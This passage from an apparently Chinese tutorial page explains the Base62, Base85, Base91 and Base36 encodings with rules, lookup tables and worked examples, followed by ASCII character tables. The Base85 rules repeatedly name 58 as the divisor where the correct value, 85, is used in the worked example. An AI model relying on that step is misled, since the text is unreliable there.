align="center">43</td><td align="center">h</td><td align="center">59</td><td align="center">x</td></tr><tr><td align="center">12</td><td align="center">C</td><td align="center">28</td><td align="center">S</td><td align="center">44</td><td align="center">i</td><td align="center">60</td><td align="center">y</td></tr><tr><td align="center">13</td><td align="center">D</td><td align="center">29</td><td align="center">T</td><td align="center">45</td><td align="center">j</td><td align="center">61</td><td align="center">z</td></tr><tr><td align="center">14</td><td align="center">E</td><td align="center">30</td><td align="center">U</td><td align="center">46</td><td align="center">k</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">15</td><td align="center">F</td><td align="center">31</td><td align="center">V</td><td align="center">47</td><td align="center">l</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="5-4、编码示例"><a href="#5-4、编码示例" class="headerlink" title="5.4、编码示例"></a>5.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>1z</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余62</code>的操作，获取余数：<code>123%62=61</code>，得到第一个编码为<code>z</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/62=1</code>；</li><li>对新数字进行<code>取余62</code>的操作，获取余数：<code>1%62=1</code>，得到第二个编码为<code>1</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>1z</code>；</li></ul><h2 id="六、Base85"><a href="#六、Base85" class="headerlink" title="六、Base85"></a>六、Base85</h2><p><code>Base85</code>又叫<code>ASCII85</code>，是<code>Paul E. Rutter</code>为<code>btoa</code>程序开发的一种<code>二进制</code>文本编码方式。</p><h3 id="6-1、编码规则"><a href="#6-1、编码规则" class="headerlink" title="6.1、编码规则"></a>6.1、编码规则</h3><p><code>Base85</code>编码使用<code>85</code>个<code>ASCII</code>可打印字符（数字<code>0～9</code>，字母<code>A~Z</code>，<code>a~u</code>，和一些其他字符）进行编码。</p><ul><li>每<code>4个ASCII</code>字符<code>一组</code>（如果最后的不够<code>4个ASCII</code>字符，右面填充二进制<code>全0</code>），<code>从左到右</code>拼接这<code>4个ASCII</code>对应的<code>二进制</code>的值，将该<code>二进制</code>转为<code>十进制</code>；</li><li>将得到的<code>十进制</code>数字对<code>58</code>做<code>取余</code>操作，得到第一个关键数字；</li><li>将得到的<code>十进制</code>数字对<code>58</code>做<code>取整</code>操作，得到新的<code>十进制</code>数字；</li><li>使用新的<code>十进制</code>数字再次对<code>58</code>进行<code>取余</code>操作，依次得到新的关键数字，直到取整的结果为<code>0</code>；</li><li>将最终得到的关键数字排序后（按照得到数字的先后，<code>从右向左</code>排序）；</li><li>参考<code>Base85</code>的编码表得到编码后的字符序列，细心点会发现，得到的关键数字加上<code>33</code>的话，也是对应的<code>ASCII</code>的值；</li><li>编码后的数据中包含像<code>反斜杠</code>、<code>引用</code>等转义字符也是<code>Base85</code>的缺点之一，因为这些字符在一些编程语言或基于文本的协议中有特殊的含义；</li></ul><h3 id="6-2、编码特征"><a href="#6-2、编码特征" class="headerlink" title="6.2、编码特征"></a>6.2、编码特征</h3><ul><li>利用<code>5个</code>ASCII字符来表示<code>4字节</code>的数据，如果每个ASCII字符占用<code>8比特</code>，则编码后的数据比原始数据大长度增加<code>1/4</code>；</li><li>比<code>UUENCODE</code>和<code>Base64</code>编码方式更加高效；</li><li><code>Base85</code>是<code>Adobe’s PostScript</code>和<code>Portable Document Format（PDF）</code>的主要编码模块；</li><li><code>4字节</code>可以表示<code>2^32=4294967296</code>个可能的值，而<code>85^5=4437053125</code>个可能的值，这就可以代表所有<code>32bit</code>的值，<code>85^4</code>可以表示<code>4182119424</code>个数值，所以<code>85的5次方</code>是基于<code>5个ASCII</code>字符表示<code>4byte</code>的最好且最小选择；</li></ul><h3 id="6-3、编码表"><a href="#6-3、编码表" class="headerlink" title="6.3、编码表"></a>6.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">!</td><td align="center">22</td><td align="center">7</td><td align="center">44</td><td align="center">M</td><td align="center">66</td><td align="center">c</td></tr><tr><td align="center">1</td><td align="center">“</td><td align="center">23</td><td align="center">8</td><td align="center">45</td><td align="center">N</td><td align="center">67</td><td align="center">d</td></tr><tr><td align="center">2</td><td align="center">#</td><td align="center">24</td><td align="center">9</td><td align="center">46</td><td align="center">O</td><td align="center">68</td><td align="center">e</td></tr><tr><td align="center">3</td><td align="center">$</td><td align="center">25</td><td align="center">:</td><td align="center">47</td><td align="center">P</td><td align="center">69</td><td align="center">f</td></tr><tr><td align="center">4</td><td align="center">%</td><td align="center">26</td><td align="center">;</td><td align="center">48</td><td align="center">Q</td><td align="center">70</td><td align="center">g</td></tr><tr><td align="center">5</td><td align="center">&amp;</td><td align="center">27</td><td align="center">&lt;</td><td align="center">49</td><td align="center">R</td><td align="center">71</td><td align="center">h</td></tr><tr><td align="center">6</td><td align="center">’</td><td align="center">28</td><td align="center">&#x3D;</td><td align="center">50</td><td align="center">S</td><td align="center">72</td><td align="center">i</td></tr><tr><td align="center">7</td><td align="center">(</td><td align="center">29</td><td align="center">&gt;</td><td align="center">51</td><td align="center">T</td><td align="center">73</td><td align="center">j</td></tr><tr><td align="center">8</td><td align="center">)</td><td align="center">30</td><td align="center">?</td><td align="center">52</td><td align="center">U</td><td align="center">74</td><td align="center">k</td></tr><tr><td align="center">9</td><td align="center">*</td><td align="center">31</td><td align="center">@</td><td align="center">53</td><td align="center">V</td><td align="center">75</td><td align="center">l</td></tr><tr><td align="center">10</td><td align="center">+</td><td align="center">32</td><td align="center">A</td><td align="center">54</td><td align="center">W</td><td align="center">76</td><td align="center">m</td></tr><tr><td align="center">11</td><td align="center">,</td><td align="center">33</td><td align="center">B</td><td align="center">55</td><td align="center">X</td><td align="center">77</td><td align="center">n</td></tr><tr><td align="center">12</td><td align="center">-</td><td align="center">34</td><td align="center">C</td><td align="center">56</td><td align="center">Y</td><td align="center">78</td><td align="center">o</td></tr><tr><td align="center">13</td><td align="center">.</td><td align="center">35</td><td align="center">D</td><td align="center">57</td><td align="center">Z</td><td align="center">79</td><td align="center">p</td></tr><tr><td align="center">14</td><td align="center">&#x2F;</td><td align="center">36</td><td align="center">E</td><td align="center">58</td><td align="center">[</td><td align="center">80</td><td align="center">q</td></tr><tr><td align="center">15</td><td align="center">0</td><td align="center">37</td><td align="center">F</td><td align="center">59</td><td align="center">\</td><td align="center">81</td><td align="center">r</td></tr><tr><td align="center">16</td><td align="center">1</td><td align="center">38</td><td align="center">G</td><td align="center">60</td><td align="center">]</td><td align="center">82</td><td align="center">s</td></tr><tr><td align="center">17</td><td align="center">2</td><td align="center">39</td><td align="center">H</td><td align="center">61</td><td align="center">^</td><td align="center">83</td><td align="center">t</td></tr><tr><td align="center">18</td><td align="center">3</td><td align="center">40</td><td align="center">I</td><td align="center">62</td><td align="center">_</td><td align="center">84</td><td align="center">u</td></tr><tr><td align="center">19</td><td align="center">4</td><td align="center">41</td><td align="center">J</td><td align="center">63</td><td align="center">&#96;</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">5</td><td align="center">42</td><td align="center">K</td><td align="center">64</td><td align="center">a</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">6</td><td align="center">43</td><td align="center">L</td><td align="center">65</td><td align="center">b</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="6-4、编码示例"><a href="#6-4、编码示例" class="headerlink" title="6.4、编码示例"></a>6.4、编码示例</h3><ul><li>待编码字符串：<code>sure</code>；</li><li>编码后字符串：<code>F*2M7</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>字符串<code>sure</code>的每位字符对应的ASCII的十进制分别为：<code>115</code>，<code>117</code>，<code>114</code>，<code>101</code>；</li><li>将十进制转换为二进制，得到的二进制序列为：<code>01110011 01110101 01110010 01100101</code>；</li><li>该二进制拼接起来后对应的十进制数字为：<code>1937076837</code>；</li><li>对该十进制数字进行循环的取余&#x2F;整操作，按照先后顺序依次得到的余数分别为：<code>22</code>，<code>44</code>，<code>17</code>，<code>9</code>，<code>37</code>；</li><li>参考Base85的编码表，对应的编码值分别为：<code>7</code>，<code>M</code>，<code>2</code>，<code>*</code>，<code>F</code>；</li><li>按照得到的余数的先后顺序逆序排列后得到最终的编码值为：<code>F*2M7</code>；</li></ul><h2 id="七、Base91"><a href="#七、Base91" class="headerlink" title="七、Base91"></a>七、Base91</h2><p>由<code>Joachim Henke</code>在2005年发明，官方的介绍页面为：<a href="http://base91.sourceforge.net/">basE91 encoding</a>。</p><h3 id="7-1、编码规则"><a href="#7-1、编码规则" class="headerlink" title="7.1、编码规则"></a>7.1、编码规则</h3><p>加密使用类似于<code>Base64</code>的方法，但将字母扩展为<code>91</code>个字符：<code>94</code>个可打印的<code>ASCII</code>字符（从<code>0x21</code>到<code>0x7E</code>），省略了<code>-</code>，<code>\</code>和<code>&#39;</code>；为了简化，将数据分为<code>13位二进制</code>数据包（即<code>2^13=8192</code>个值），然后将其编码为<code>2个字母</code>（包含<code>91</code>个字符，其中<code>91^2=8281</code>）；</p><ul><li>将输入的数据看作<code>二进制</code>信息流；</li><li>每次从信息流中读取<code>13位</code>的比特数据，将这组合成的<code>13位</code>比特转换为<code>10进制</code>的整数；</li><li>如果该整数<code>小于或等于88</code>，则额外再读取一位，并将这一位放在整数的第<code>14</code>位（最低位为1）（原因：由于<code>91^2=8281</code>，最大可表示为<code>8280</code>，而<code>2^13=8192</code>，因此即使二进制<code>13</code>位全部为<code>1</code>，也可能）；</li><li>将得到的整数拆分为<code>两个</code>编码值，第一个编码值为<code>整数%91</code>，第二个编码值为<code>整数/91</code>，依据<code>Base91</code>的编码表得到对应的编码后的数据；</li><li>依次循环编码接下来的<code>二进制</code>信息流；</li></ul><h3 id="7-2、编码特征"><a href="#7-2、编码特征" class="headerlink" title="7.2、编码特征"></a>7.2、编码特征</h3><ul><li>该算法相对于<code>Base64</code>来说比较复杂，但更节省空间；</li><li>与<code>Base64</code>不同，输出的大小有点依赖于输入字节，长度为<code>0x00</code>的<code>n序列</code>将<code>短于</code>长度为<code>0xFF</code>的<code>n序列</code>（其中<code>n</code>是足够大的数字）;</li></ul><h3 id="7-3、编码表"><a href="#7-3、编码表" class="headerlink" title="7.3、编码表"></a>7.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">23</td><td align="center">X</td><td align="center">46</td><td align="center">u</td><td align="center">69</td><td align="center">*</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">24</td><td align="center">Y</td><td align="center">47</td><td align="center">v</td><td align="center">70</td><td align="center">+</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">25</td><td align="center">Z</td><td align="center">48</td><td align="center">w</td><td align="center">71</td><td align="center">,</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">26</td><td align="center">a</td><td align="center">49</td><td align="center">x</td><td align="center">72</td><td align="center">.</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">27</td><td align="center">b</td><td align="center">50</td><td align="center">y</td><td align="center">73</td><td align="center">&#x2F;</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">28</td><td align="center">c</td><td align="center">51</td><td align="center">z</td><td align="center">74</td><td align="center">:</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">29</td><td align="center">d</td><td align="center">52</td><td align="center">0</td><td align="center">75</td><td align="center">;</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">30</td><td align="center">e</td><td align="center">53</td><td align="center">1</td><td align="center">76</td><td align="center">&lt;</td></tr><tr><td align="center">8</td><td align="center">I</td><td align="center">31</td><td align="center">f</td><td align="center">54</td><td align="center">2</td><td align="center">77</td><td align="center">&#x3D;</td></tr><tr><td align="center">9</td><td align="center">J</td><td align="center">32</td><td align="center">g</td><td align="center">55</td><td align="center">3</td><td align="center">78</td><td align="center">&gt;</td></tr><tr><td align="center">10</td><td align="center">K</td><td align="center">33</td><td align="center">h</td><td align="center">56</td><td align="center">4</td><td align="center">79</td><td align="center">?</td></tr><tr><td align="center">11</td><td align="center">L</td><td align="center">34</td><td align="center">i</td><td align="center">57</td><td align="center">5</td><td align="center">80</td><td align="center">@</td></tr><tr><td align="center">12</td><td align="center">M</td><td align="center">35</td><td align="center">j</td><td align="center">58</td><td align="center">6</td><td align="center">81</td><td align="center">[</td></tr><tr><td align="center">13</td><td align="center">N</td><td align="center">36</td><td align="center">k</td><td align="center">59</td><td align="center">7</td><td align="center">82</td><td align="center">]</td></tr><tr><td align="center">14</td><td align="center">O</td><td align="center">37</td><td align="center">l</td><td align="center">60</td><td align="center">8</td><td align="center">83</td><td align="center">^</td></tr><tr><td align="center">15</td><td align="center">P</td><td align="center">38</td><td align="center">m</td><td align="center">61</td><td align="center">9</td><td align="center">84</td><td align="center">_</td></tr><tr><td align="center">16</td><td align="center">Q</td><td align="center">39</td><td align="center">n</td><td align="center">62</td><td align="center">!</td><td align="center">85</td><td align="center">&#96;</td></tr><tr><td align="center">17</td><td align="center">R</td><td align="center">40</td><td align="center">o</td><td align="center">63</td><td align="center">#</td><td align="center">86</td><td align="center">{</td></tr><tr><td align="center">18</td><td align="center">S</td><td align="center">41</td><td align="center">p</td><td align="center">64</td><td align="center">$</td><td align="center">87</td><td align="center">|</td></tr><tr><td align="center">19</td><td align="center">T</td><td align="center">42</td><td align="center">q</td><td align="center">65</td><td align="center">%</td><td align="center">88</td><td align="center">}</td></tr><tr><td align="center">20</td><td align="center">U</td><td align="center">43</td><td align="center">r</td><td align="center">66</td><td align="center">&amp;</td><td align="center">89</td><td align="center">~</td></tr><tr><td align="center">21</td><td align="center">V</td><td align="center">44</td><td align="center">s</td><td align="center">67</td><td align="center">(</td><td align="center">90</td><td align="center">“</td></tr><tr><td align="center">22</td><td align="center">W</td><td align="center">45</td><td align="center">t</td><td align="center">68</td><td align="center">)</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="7-4、编码示例"><a href="#7-4、编码示例" class="headerlink" title="7.4、编码示例"></a>7.4、编码示例</h3><ul><li>待编码字符串：<code>abc</code>；</li><li>编码后字符串：<code>#G(I</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>字符串<code>abc</code>的每位字符对应的<code>ASCII</code>的<code>十进制</code>分别为：<code>97</code>，<code>98</code>，<code>99</code>；</li><li>将<code>十进制</code>转换为<code>二进制</code>，得到的<code>二进制</code>序列为：<code>01100001  01100010  01100011</code>；</li><li>读取该<code>二进制</code>信息流之后，得到的第一个<code>二进制</code>串为：<code>00010  01100001</code>，该<code>二进制</code>串的后半部分为<code>字符a</code>的<code>二进制</code>编码，前半部分为<code>字符b</code>的部分<code>二进制</code>编码；</li><li>拼接后的<code>二进制</code>串对应的<code>十进制</code>整数为：<code>609</code>，因此首先得到的两个编码值为：<code>609%91=63</code>，<code>609/91=6</code>，对应的编码为：<code>#</code>、<code>G</code>；</li><li>继续处理剩余的二进制序列为：<code>00 01100011 011</code>，对应得到的<code>十进制</code>整数为：<code>795</code>，因此得到的两个编码值为：<code>795%91=67</code>，<code>795/91=8</code>，对应的编码为：<code>(</code>、<code>I</code>；</li><li>因此最终得到的最终编码为：<code>#G(I</code>；</li></ul><h2 id="八、Base-X-2～36"><a href="#八、Base-X-2～36" class="headerlink" title="八、Base X(2～36)"></a>八、Base X(2～36)</h2><p><code>BaseX(2～36)</code>，其中<code>X</code>可以为<code>2～36</code>的所有编码规则完全一致，这里以<code>Base36</code>为例作一下详细介绍。</p><h3 id="8-1、编码规则"><a href="#8-1、编码规则" class="headerlink" title="8.1、编码规则"></a>8.1、编码规则</h3><p><code>Base36</code>编码使用<code>36</code>个<code>ASCII</code>可打印字符（数字<code>0-9</code>和字母<code>A-Z</code>）对<strong>数字</strong>进行编码。</p><ul><li>通过对数字不断<code>取余36</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="8-2、编码特征"><a href="#8-2、编码特征" class="headerlink" title="8.2、编码特征"></a>8.2、编码特征</h3><ul><li><code>Base 36</code>的编码规则不同于<code>Base 16/32/64</code>，它无法按照比特范围进行编码操作，需要按照<code>取余/整</code>的不断操作，经过与编码表的对应获得最终的编码值；</li><li>对于字符串的相关编码操作，需要将<code>String</code>的字符串转换为基数为<code>2～36</code>的无符号长整型，再进行编码操作；</li><li><code>有符号的32位整数</code>的<code>最大值</code>的<code>Base36</code>编码为：<code>ZIK0ZJ</code>；</li><li><code>有符号的64位整数</code>的<code>最大值</code>的<code>Base36</code>编码为：<code>1Y2P0IJ32E8E7</code>；</li></ul><h3 id="8-3、编码表"><a href="#8-3、编码表" class="headerlink" title="8.3、编码表"></a>8.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">12</td><td align="center">C</td><td align="center">24</td><td align="center">O</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">13</td><td align="center">D</td><td align="center">25</td><td align="center">P</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">14</td><td align="center">E</td><td align="center">26</td><td align="center">Q</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">15</td><td align="center">F</td><td align="center">27</td><td align="center">R</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">16</td><td align="center">G</td><td align="center">28</td><td align="center">S</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">17</td><td align="center">H</td><td align="center">29</td><td align="center">T</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">18</td><td align="center">I</td><td align="center">30</td><td align="center">U</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">19</td><td align="center">J</td><td align="center">31</td><td align="center">V</td></tr><tr><td align="center">8</td><td align="center">8</td><td align="center">20</td><td align="center">K</td><td align="center">32</td><td align="center">W</td></tr><tr><td align="center">9</td><td align="center">9</td><td align="center">21</td><td align="center">L</td><td align="center">33</td><td align="center">X</td></tr><tr><td align="center">10</td><td align="center">A</td><td align="center">22</td><td align="center">M</td><td align="center">34</td><td align="center">Y</td></tr><tr><td align="center">11</td><td align="center">B</td><td align="center">23</td><td align="center">N</td><td align="center">35</td><td align="center">Z</td></tr></tbody></table><h3 id="8-4、编码示例"><a href="#8-4、编码示例" class="headerlink" title="8.4、编码示例"></a>8.4、编码示例</h3><ul><li>待编码数字：<code>123</code>；</li><li>编码后字符串：<code>3F</code>；</li></ul><p><strong>解析过程如下所示：</strong></p><ul><li>对数字进行<code>取余36</code>的操作，获取余数：<code>123%36=15</code>，得到第一个编码为<code>F</code>；</li><li>对数字进行取整操作，新的数字为取整之后的值：<code>123/36=3</code>；</li><li>对新数字进行<code>取余36</code>的操作，获取余数：<code>3%36=3</code>，得到第二个编码为<code>3</code>；</li><li>依次循环最终新数字为<code>0</code>时结束；</li><li>最后得到的编码为<code>3F</code>；</li></ul><h2 id="九、ASCII字符表"><a href="#九、ASCII字符表" class="headerlink" title="九、ASCII字符表"></a>九、ASCII字符表</h2><h3 id="9-1、ASCII可显示字符"><a href="#9-1、ASCII可显示字符" class="headerlink" title="9.1、ASCII可显示字符"></a>9.1、ASCII可显示字符</h3><table><thead><tr><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">00100000</td><td align="center">32</td><td align="center">0x20</td><td align="center">空格</td><td align="center">01000000</td><td align="center">64</td><td align="center">0x40</td><td align="center">@</td><td align="center">01100000</td><td align="center">96</td><td align="center">0x60</td><td align="center">&#96;</td></tr><tr><td align="center">00100001</td><td align="center">33</td><td align="center">0x21</td><td align="center">!</td><td align="center">01000001</td><td align="center">65</td><td align="center">0x41</td><td align="center">A</td><td align="center">01100001</td><td align="center">97</td><td align="center">0x61</td><td align="center">a</td></tr><tr><td align="center">00100010</td><td align="center">34</td><td align="center">0x22</td><td align="center">“</td><td align="center">01000010</td><td align="center">66</td><td align="center">0x42</td><td align="center">B</td><td align="center">01100010</td><td align="center">98</td><td align="center">0x62</td><td align="center">b</td></tr><tr><td align="center">00100011</td><td align="center">35</td><td align="center">0x23</td><td align="center">#</td><td align="center">01000011</td><td align="center">67</td><td align="center">0x43</td><td align="center">C</td><td align="center">01100011</td><td align="center">99</td><td align="center">0x63</td><td align="center">c</td></tr><tr><td align="center">00100100</td><td align="center">36</td><td align="center">0x24</td><td align="center">$</td><td align="center">01000100</td><td align="center">68</td><td align="center">0x44</td><td align="center">D</td><td align="center">01100100</td><td align="center">100</td><td align="center">0x64</td><td align="center">d</td></tr><tr><td align="center">00100101</td><td align="center">37</td><td align="center">0x25</td><td align="center">%</td><td align="center">01000101</td><td align="center">69</td><td align="center">0x45</td><td align="center">E</td><td align="center">01100101</td><td align="center">101</td><td align="center">0x65</td><td align="center">e</td></tr><tr><td align="center">00100110</td><td align="center">38</td><td align="center">0x26</td><td align="center">&amp;</td><td align="center">01000110</td><td align="center">70</td><td align="center">0x46</td><td align="center">F</td><td align="center">01100110</td><td align="center">102</td><td align="center">0x66</td><td align="center">f</td></tr><tr><td align="center">00100111</td><td align="center">39</td><td align="center">0x27</td><td align="center">‘</td><td align="center">01000111</td><td align="center">71</td><td align="center">0x47</td><td align="center">G</td><td align="center">01100111</td><td align="center">103</td><td align="center">0x67</td><td align="center">g</td></tr><tr><td align="center">00101000</td><td align="center">40</td><td align="center">0x28</td><td align="center">(</td><td align="center">01001000</td><td align="center">72</td><td align="center">0x48</td><td align="center">H</td><td align="center">01101000</td><td align="center">104</td><td align="center">0x68</td><td align="center">h</td></tr><tr><td align="center">00101001</td><td align="center">41</td><td align="center">0x29</td><td align="center">)</td><td align="center">01001001</td><td align="center">73</td><td align="center">0x49</td><td align="center">I</td><td align="center">01101001</td><td align="center">105</td><td align="center">0x69</td><td align="center">i</td></tr><tr><td align="center">00101010</td><td align="center">42</td><td align="center">0x2A</td><td align="center">*</td><td align="center">01001010</td><td align="center">74</td><td align="center">0x4A</td><td align="center">J</td><td align="center">01101010</td><td align="center">106</td><td align="center">0x6A</td><td align="center">j</td></tr><tr><td align="center">00101011</td><td align="center">43</td><td align="center">0x2B</td><td align="center">+</td><td align="center">01001011</td><td align="center">75</td><td align="center">0x4B</td><td align="center">K</td><td align="center">01101011</td><td align="center">107</td><td align="center">0x6B</td><td align="center">k</td></tr><tr><td align="center">00101100</td><td align="center">44</td><td align="center">0x2C</td><td align="center">,</td><td align="center">01001100</td><td align="center">76</td><td align="center">0x4C</td><td align="center">L</td><td align="center">01101100</td><td align="center">108</td><td align="center">0x6C</td><td align="center">l</td></tr><tr><td align="center">00101101</td><td align="center">45</td><td align="center">0x2D</td><td align="center">-</td><td align="center">01001101</td><td align="center">77</td><td align="center">0x4D</td><td align="center">M</td><td align="center">01101101</td><td align="center">109</td><td align="center">0x6D</td><td align="center">m</td></tr><tr><td align="center">00101110</td><td align="center">46</td><td align="center">0x2E</td><td align="center">.</td><td align="center">01001110</td><td align="center">78</td><td align="center">0x4E</td><td align="center">N</td><td align="center">01101110</td><td align="center">110</td><td align="center">0x6E</td><td align="center">n</td></tr><tr><td align="center">00101111</td><td align="center">47</td><td align="center">0x2F</td><td align="center">&#x2F;</td><td align="center">01001111</td><td align="center">79</td><td align="center">0x4F</td><td align="center">O</td><td align="center">01101111</td><td align="center">111</td><td align="center">0x6F</td><td align="center">o</td></tr><tr><td align="center">00110000</td><td align="center">48</td><td align="center">0x30</td><td align="center">0</td><td align="center">01010000</td><td align="center">80</td><td align="center">0x50</td><td align="center">P</td><td align="center">01110000</td><td align="center">112</td><td align="center">0x70</td><td align="center">p</td></tr><tr><td align="center">00110001</td><td align="center">49</td><td align="center">0x31</td><td align="center">1</td><td align="center">01010001</td><td align="center">81</td><td align="center">0x51</td><td align="center">Q</td><td align="center">01110001</td><td align="center">113</td><td align="center">0x71</td><td align="center">q</td></tr><tr><td align="center">00110010</td><td align="center">50</td><td align="center">0x32</td><td align="center">2</td><td align="center">01010010</td><td align="center">82</td><td align="center">0x52</td><td align="center">R</td><td align="center">01110010</td><td align="center">114</td><td align="center">0x72</td><td align="center">r</td></tr><tr><td align="center">00110011</td><td align="center">51</td><td align="center">0x33</td><td align="center">3</td><td align="center">01010011</td><td align="center">83</td><td align="center">0x53</td><td align="center">S</td><td align="center">01110011</td><td align="center">115</td><td align="center">0x73</td><td align="center">s</td></tr><tr><td align="center">00110100</td><td align="center">52</td><td align="center">0x34</td><td align="center">4</td><td align="center">01010100</td><td align="center">84</td><td align="center">0x54</td><td align="center">T</td><td align="center">01110100</td><td align="center">116</td><td align="center">0x74</td><td align="center">t</td></tr><tr><td align="center">00110101</td><td align="center">53</td><td align="center">0x35</td><td align="center">5</td><td align="center">01010101</td><td align="center">85</td><td align="center">0x55</td><td align="center">U</td><td align="center">01110101</td><td align="center">117</td><td align="center">0x75</td><td align="center">u</td></tr><tr><td align="center">00110110</td><td align="center">54</td><td align="center">0x36</td><td align="center">6</td><td align="center">01010110</td><td align="center">86</td><td align="center">0x56</td><td align="center">V</td><td align="center">01110110</td><td align="center">118</td><td align="center">0x76</td><td align="center">v</td></tr><tr><td align="center">00110111</td><td align="center">55</td><td align="center">0x37</td><td align="center">7</td><td align="center">01010111</td><td align="center">87</td><td align="center">0x57</td><td align="center">W</td><td align="center">01110111</td><td align="center">119</td><td align="center">77</td><td align="center">w</td></tr><tr><td align="center">00111000</td><td align="center">56</td><td align="center">0x38</td><td align="center">8</td><td align="center">01011000</td><td align="center">88</td><td align="center">0x58</td><td align="center">X</td><td align="center">01111000</td><td align="center">120</td><td align="center">0x78</td><td align="center">x</td></tr><tr><td align="center">00111001</td><td align="center">57</td><td align="center">0x39</td><td align="center">9</td><td align="center">01011001</td><td align="center">89</td><td align="center">0x59</td><td align="center">Y</td><td align="center">01111001</td><td align="center">121</td><td align="center">0x79</td><td align="center">y</td></tr><tr><td align="center">00111010</td><td align="center">58</td><td align="center">0x3A</td><td align="center">:</td><td align="center">01011010</td><td align="center">90</td><td align="center">0x5A</td><td align="center">Z</td><td align="center">01111010</td><td align="center">122</td><td align="center">0x7A</td><td align="center">z</td></tr><tr><td align="center">00111011</td><td align="center">59</td><td align="center">0x3B</td><td align="center">;</td><td align="center">01011011</td><td align="center">91</td><td align="center">0x5B</td><td align="center">[</td><td align="center">01111011</td><td align="center">123</td><td align="center">0x7B</td><td align="center">{</td></tr><tr><td align="center">00111100</td><td align="center">60</td><td align="center">0x3C</td><td align="center">&lt;</td><td align="center">01011100</td><td align="center">92</td><td align="center">0x5C</td><td align="center">\</td><td align="center">01111100</td><td align="center">124</td><td align="center">0x7C</td><td align="center">|</td></tr><tr><td align="center">00111101</td><td align="center">61</td><td align="center">0x3D</td><td align="center">&#x3D;</td><td align="center">01011101</td><td align="center">93</td><td align="center">0x5D</td><td align="center">]</td><td align="center">01111101</td><td align="center">125</td><td align="center">0x7D</td><td align="center">}</td></tr><tr><td align="center">00111110</td><td align="center">62</td><td align="center">0x3E</td><td align="center">&gt;</td><td align="center">01011110</td><td align="center">94</td><td align="center">0x5E</td><td align="center">^</td><td align="center">01111110</td><td align="center">126</td><td align="center">0x7E</td><td align="center">~</td></tr><tr><td align="center">00111111</td><td align="center">63</td><td align="center">0x3F</td><td align="center">?</td><td align="center">01011111</td><td align="center">95</td><td align="center">0x5F</td><td align="center">_</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="9-2、ASCII控制字符"><a href="#9-2、ASCII控制字符" class="headerlink" title="9.2、ASCII控制字符"></a>9.2、ASCII控制字符</h3><table><thead><tr><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">缩写</th><th align="center">名称&#x2F;意义</th></tr></thead><tbody><tr><td align="center">0000 0000</td><td align="center">0</td><td align="center">0x0</td><td align="center">NUL</td><td align="center">空字符（Null）</td></tr><tr><td align="center">0000 0001</td><td align="center">1</td><td align="center">0x1</td><td align="center">SOH</td><td align="center">标题开始</td></tr><tr><td align="center">0000 0010</td><td align="center">2</td><td align="center">0x2</td><td align="center">STX</td><td align="center">本文开始</td></tr><tr><td align="center">0000 0011</td><td align="center">3</td><td align="center">0x3</td><td align="center">ETX</td><td align="center">本文结束</td></tr><tr><td align="center">0000 0100</td><td align="center">4</td><td align="center">0x4</td><td align="center">EOT</td><td align="center">传输结束</td></tr><tr><td align="center">0000 0101</td><td align="center">5</td><td align="center">0x5</td><td align="center">ENQ</td><td align="center">请求</td></tr><tr><td align="center">0000 0110</td><td align="center">6</td><td align="center">0x6</td><td align="center">ACK</td><td align="center">确认回应</td></tr><tr><td align="center">0000 0111</td><td align="center">7</td><td align="center">0x7</td><td align="center">BEL</td><td align="center">响铃</td></tr><tr><td align="center">0000 1000</td><td align="center">8</td><td align="center">0x8</td><td align="center">BS</td><td align="center">退格</td></tr><tr><td align="center">0000 1001</td><td align="center">9</td><td align="center">0x9</td><td align="center">HT</td><td align="center">水平定位符号</td></tr><tr><td align="center">0000 